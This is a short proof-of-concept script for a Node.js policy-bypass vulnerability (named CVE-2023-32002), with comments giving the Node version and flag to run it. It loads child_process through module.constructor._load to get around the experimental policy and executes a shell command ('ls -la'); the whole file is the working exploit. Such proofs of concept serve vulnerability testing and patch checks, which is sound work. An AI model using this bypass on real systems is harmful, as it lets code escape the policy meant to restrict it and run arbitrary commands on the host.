// nvm use 20.0.0
// node --experimental-policy=policy.json CVE-2023-32002.js

const child_process = module.constructor._load("node:child_process");
console.log(child_process.execSync("ls -la").toString());